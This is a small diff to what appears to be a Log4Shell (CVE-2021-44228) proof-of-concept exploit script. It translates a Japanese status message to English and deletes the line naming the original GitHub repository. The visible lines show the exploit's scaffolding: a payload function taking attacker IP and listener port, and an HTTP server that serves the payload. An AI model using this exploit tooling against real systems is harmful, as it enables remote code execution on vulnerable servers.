@@ -77,7 +77,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
     t1.start()
 
     # start the web server
-    print(f"[+] ポートでウェブサーバを起動 {webport} http://0.0.0.0:{webport}")
+    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
     httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
@@ -108,7 +108,6 @@ def main() -> None:
     init(autoreset=True)
     print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
 """)
 
     parser = argparse.ArgumentParser(description='log4shell PoC')
